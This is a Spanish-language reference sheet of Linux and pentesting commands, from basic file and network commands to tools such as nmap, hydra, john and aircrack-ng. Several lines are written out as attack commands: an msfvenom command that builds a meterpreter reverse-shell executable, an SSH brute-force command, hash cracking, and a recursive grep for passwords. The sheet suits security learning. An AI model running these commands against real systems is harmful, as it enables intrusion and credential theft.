Comandos Básicos Redes Seguridad Herramientas Pentesting

Terminal Index

Comandos del Sistema BASIC

ifconfig
Muestra los adaptadores de red
su <nombre_usuario>
Permite cambiar de usuario
pwd
Muestra el directorio actual
ls
Listar directorios
ls -l - Listar con formato ampliado
ls -la - Mostrar archivos ocultos
ls -lh - Mostrar tamaños legibles
cd <directorio>
Cambiar de directorio
cd .. - Directorio anterior
cd ~ - Directorio home
find
Buscar archivos y directorios
find / -name "*.txt" - Buscar archivos txt
find . -type f -size +10M - Archivos mayores a 10MB
grep
Buscar patrones en archivos
grep -r "password" /etc/ - Buscar recursivamente

Comandos de Red NETWORK

ip a
Mostrar interfaces de red
netstat -tulpn
Mostrar puertos abiertos
ss -tulpn
Alternativa moderna a netstat
arp-scan -l
Escanear dispositivos en la red local
tcpdump -i eth0
Sniffing de paquetes
wireshark
Analizador de protocolos GUI

Seguridad y Permisos SECURITY

chmod
Cambiar permisos de archivos
chmod 755 archivo - Permisos estándar
chmod +x script.sh - Hacer ejecutable
chown
Cambiar propietario
chown usuario:grupo archivo
passwd
Cambiar contraseña
sudo
Ejecutar como superusuario
adduser
Agregar usuario
deluser
Eliminar usuario

Herramientas de Seguridad TOOLS

nmap
Escáner de puertos y servicios
nmap -sS -sV 192.168.1.1 - Escaneo sigiloso
nmap -A -T4 target - Escaneo agresivo
metasploit
Framework de penetration testing
msfconsole - Iniciar Metasploit
sqlmap
Automation de SQL injection
burpsuite
Testing de aplicaciones web
john
Password cracking
john --wordlist=passwords.txt hashfile

Comandos de Pentesting PENTEST

airmon-ng
Monitor mode para WiFi
airmon-ng start wlan0
airodump-ng
Captura de paquetes WiFi
msfvenom
Generar payloads
msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe > payload.exe
hydra
Ataques de fuerza bruta
hydra -l user -P passlist.txt ssh://192.168.1.1
nikto
Escáner de vulnerabilidades web
wpscan
Escáner de seguridad WordPress
